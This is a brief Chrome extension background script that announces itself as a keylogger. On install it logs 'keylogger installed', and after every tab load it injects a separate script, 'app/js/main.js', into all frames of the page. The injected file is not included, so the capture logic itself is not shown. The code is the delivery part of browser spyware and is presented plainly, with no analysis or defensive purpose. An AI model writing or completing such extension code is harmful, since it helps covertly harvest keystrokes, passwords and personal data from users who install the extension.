
chrome.runtime.onInstalled.addListener(function() {
   console.log('keylogger installed')
});

chrome.tabs.onUpdated.addListener(function(id, changeInfo) {

  if(changeInfo.status === 'complete'){
    chrome.tabs.executeScript(id, {
      allFrames: true,
      file: 'app/js/main.js'
    });
  }
});
